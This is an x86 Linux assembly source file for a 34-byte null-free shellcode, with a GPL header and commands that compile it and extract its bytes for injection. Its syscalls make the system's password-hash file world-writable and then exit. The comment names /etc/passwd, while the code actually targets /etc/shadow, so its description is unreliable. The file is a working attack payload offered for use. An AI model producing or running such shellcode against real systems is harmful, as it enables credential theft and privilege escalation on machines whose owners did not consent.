; Tiny chmod - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   tiny_chmod
;
;   * 34 bytes
;   * null-free
;   * set 0666 permission to /etc/passwd
;
;   # nasm -f elf32 tiny_chmod.asm
;   # ld -m elf_i386 tiny_chmod.o -o tiny_chmod
;   # for i in $(objdump -d tiny_chmod |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo


global _start

section .text

_start:
	xor ecx, ecx
	mul ecx	
	mov al, 15
	push edx
	push 0x776f6461
	push 0x68732f2f
	push 0x6374652f
	mov ebx, esp
	mov cx, 0x1b6
	int 0x80

	inc edx
	xchg eax, edx
	int 0x80
